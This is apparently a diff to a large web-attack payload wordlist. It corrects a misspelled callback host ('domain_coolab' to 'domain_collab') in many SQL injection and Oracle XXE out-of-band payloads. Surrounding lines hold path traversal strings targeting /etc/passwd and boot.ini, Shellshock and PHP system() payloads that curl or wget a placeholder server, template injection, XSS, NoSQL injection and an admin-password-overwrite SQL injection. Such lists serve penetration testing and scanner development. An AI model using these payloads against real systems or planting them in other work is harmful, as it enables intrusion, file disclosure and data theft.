 /%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/passwd
 %uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216/etc/passwd
@@ -8825,16 +8825,16 @@ Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUw
 " LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
 ' LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
 ` LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-") LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-"; LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-"||LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-') LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-'; LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-'||LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-`) LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-`; LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-`||LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-OR LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
+") LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+"; LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+"||LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+') LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+'; LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+'||LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+`) LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+`; LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+`||LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
 /........................................................................../../../../
 /..........................................................................\..\..\..\
 /0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f
@@ -8851,7 +8851,7 @@ OR LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\
 %2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd;index.html
 /%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66
 /%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63
-AND LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
+AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
 db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
 ") LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
 "; LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
@@ -8862,9 +8862,9 @@ db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emi
 `) LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
 `; LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
 `||LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-")) LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-')) LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-`)) LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
+")) LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+')) LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+`)) LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
 OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
 /%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/boot.ini
 /%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\boot.ini
@@ -8892,9 +8892,9 @@ AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab
 ")) LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
 ')) LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
 `)) LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-" OR LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-' OR LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-` OR LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
+" OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+' OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+` OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
 %uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/boot.ini
 %uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\boot.ini
 <xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
@@ -8903,9 +8903,9 @@ AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab
 %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd%00index.html
 %2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd%00index.html
 ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
-" AND LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-' AND LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-` AND LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
+" AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+' AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+` AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
 () { :;}; /bin/bash -c "curl http://vps_ip/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`"
 () { :;}; /bin/bash -c "wget http://vps_ip/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`"
 /........................................................................../../boot.ini
@@ -8917,9 +8917,9 @@ AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab
 " OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
 ' OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
 ` OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-") OR LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-') OR LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-`) OR LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
+") OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+') OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+`) OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
 /%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/boot.ini
 /%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\boot.ini
 /........................................................................../../../../../
@@ -8931,17 +8931,17 @@ AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab
 " AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
 ' AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
 ` AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-") AND LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-') AND LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-`) AND LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
+") AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+') AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+`) AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
 Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
 Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
 ") OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
 ') OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
 `) OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-")) OR LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-')) OR LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-`)) OR LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
+")) OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+')) OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+`)) OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
 <?php system("curl https://domain_collab/.testing/rce_vuln.txt?method=phpsystem_get");?>
 <?php system("wget https://domain_collab/.testing/rce_vuln.txt?method=phpsystem_get");?>
 {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
@@ -8951,9 +8951,9 @@ Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3
 ") AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
 ') AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
 `) AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-")) AND LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-')) AND LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-`)) AND LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
+")) AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+')) AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+`)) AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
 ........................................................................../../../boot.ini
 ..........................................................................\..\..\boot.ini
 %c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e//etc/passwd
@@ -9528,21 +9528,21 @@ declare @q nvarchar (200) select @q = 0x770061006900740066006F007200200064006500
 attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" --
 %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c
 /redirect?url=Https://google.com&next=Https://google.com&redirect=Https://google.com&redir=Https://google.com&rurl=Https://google.com&redirect_uri=Https://google.com
-" SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-` SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l' FROM dual--
-OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
+" SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+` SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l' FROM dual--
+OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
 " SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
 ` SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-") SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-"; SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-"||SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-') SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-'; SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-'||SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-`) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-`; SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-`||SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
+") SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+"; SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+"||SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+') SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+'; SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+'||SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+`) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+`; SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+`||SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
 AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l' FROM dual-- 
 OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
 ") SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
@@ -9554,49 +9554,49 @@ OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE 
 `) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
 `; SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
 `||SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-")) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-')) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-`)) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
+")) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+')) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+`)) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
 /%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/
 /%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\
 /%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66
 /%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63
-" OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-' OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-` OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
+" OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+' OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+` OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
 ")) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
 ')) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
 `)) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-" AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-' AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-` AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
+" AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+' AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+` AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
 " OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
 ' OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
 ` OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-") OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-') OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-`) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
+") OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+') OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+`) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
 " AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
 ' AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
 ` AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
